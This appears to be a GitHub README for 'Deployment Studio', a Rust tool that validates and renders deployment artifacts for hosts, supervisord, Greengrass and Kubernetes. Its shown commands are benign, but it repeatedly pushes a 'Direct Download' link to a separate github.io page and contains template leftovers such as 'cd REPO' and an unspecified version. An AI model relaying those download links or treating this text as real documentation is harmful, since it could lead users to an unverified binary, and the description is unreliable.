# Deployment Studio - Deployment Control Plane 2026

> **Deployment Studio is a cross-platform Rust control plane for defining, validating, compiling, and reviewing deployments across HOST, supervisord, AWS Greengrass, and Kubernetes workflows.**

[![Platform](https://img.shields.io/badge/Platform-Cross--platform-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-Not%20specified-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/bastianwolf99/deployment-studio-win-21939?style=flat-square)](https://github.com/bastianwolf99/deployment-studio-win-21939)

---

<p align="center">
  <a href="https://bastianwolf99.github.io/deployment-studio-win-21939/">
    <img src="https://img.shields.io/badge/Download-Deployment%20Studio%20Latest-brightgreen?style=for-the-badge" alt="Download Deployment Studio">
  </a>
</p>

> **[Direct Download - Deployment Studio](https://bastianwolf99.github.io/deployment-studio-win-21939/)**

---

[Download Latest Build](https://bastianwolf99.github.io/deployment-studio-win-21939/)

---

## About Deployment Studio

Deployment Studio provides a single control plane for expressing deployment intent through typed deployment definitions. Its Rust-based kernel can validate those definitions and deterministically render platform-specific artifacts, helping teams inspect generated output before anything is applied.

The workflow is designed for environments that span local hosts, supervisord-managed services, AWS Greengrass things, and Kubernetes clusters. Git provides an audit trail for definition changes, while evidence-gated releases and proof-oriented testing support a reviewable path from configuration to deployment.

---

## Features

- Typed schema for structured deployment definitions
- Deterministic compilation into platform-native artifacts
- HOST and supervisord bundle generation
- AWS Greengrass recipe and per-thing deployment generation
- Kubernetes manifest generation
- Git-based history for deployment changes
- Generate-only workflow for reviewing output before apply
- Deployment validation, rendering, and oracle-based proof testing
- Evidence-gated release flow

---

## Installation

### Clone the repository

```bash
git clone https://github.com/bastianwolf99/deployment-studio-win-21939.git
cd REPO
```

### Build the Rust kernel

Ensure Rust and Cargo are installed, then build the project:

```bash
cargo build --release
```

The resulting binary can be used as the Deployment Studio CLI. Run the project help command to inspect the available operations:

```bash
cargo run -- --help
```

You can also use the compiled release binary from the repository's Rust build output.

---

## Usage

A typical workflow separates definition authoring, validation, rendering, review, and application:

1. Create or update a typed deployment definition.
2. Validate the definition against the deployment schema.
3. Render the requested target artifacts.
4. Review generated files and record changes in Git.
5. Run deployment proof or oracle-based checks.
6. Apply the reviewed artifacts through the appropriate platform workflow.

A representative CLI session may look like this:

```bash
cargo run -- validate path/to/deployment-definition
cargo run -- render path/to/deployment-definition --target kubernetes
cargo run -- render path/to/deployment-definition --target greengrass
```

Use the command help output for the exact subcommands and options available in the current build:

```bash
cargo run -- --help
cargo run -- validate --help
cargo run -- render --help
```

The generate-only approach allows teams to inspect platform-native output before an apply step is considered.

---

## Configuration

Deployment Studio uses deployment-definition files as the primary configuration surface. Keep these definitions in Git so schema changes, generated output, reviews, and release evidence remain associated with the project history.

A minimal conceptual definition might be organized like this:

```yaml
name: example-deployment
targets:
  - kubernetes
services:
  - name: example-service
    source: ./service
```

The exact fields and supported target options are defined by the typed schema in the project. Validate configuration before rendering artifacts:

```bash
cargo run -- validate path/to/deployment-definition
```

---

## Requirements

- A supported cross-platform development environment
- Rust and Cargo for building or running the CLI
- Git for source control and deployment audit history
- Access to the target platform when generated artifacts are applied
- Storage for deployment definitions, rendered artifacts, and Git history

Target-specific workflows may additionally require the tooling and credentials expected by Kubernetes, AWS Greengrass, HOST, or supervisord environments.

---

## FAQ

### Who is Deployment Studio for?

It is intended for teams managing deployments across multiple execution environments, including local hosts, supervisord services, AWS Greengrass devices, and Kubernetes clusters.

### How do I check the available commands?

Run:

```bash
cargo run -- --help
```

Subcommand help is also available, for example:

```bash
cargo run -- render --help
```

### Can I review output without applying a deployment?

Yes. Deployment Studio supports a generate-only workflow, allowing rendered artifacts to be inspected and reviewed before an apply step.

### Where should deployment definitions be stored?

Store them in the repository alongside the project that owns the deployment. Git can then provide change history and an audit trail for definition updates and generated results.

### What should I do if validation fails?

Review the reported schema or definition errors, correct the source file, and run validation again before rendering target artifacts.

### How are updates obtained?

Use the repository's latest build link or pull newer source changes from Git, then rebuild the Rust CLI:

```bash
git pull
cargo build --release
```

### Which targets can be generated?

The profile includes HOST and supervisord bundles, AWS Greengrass recipes and per-thing deployments, and Kubernetes manifests.

---

## Roadmap

- Continue refining typed deployment-definition coverage
- Expand validation and rendering workflows
- Improve evidence-gated release support
- Extend proof testing across supported deployment targets

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
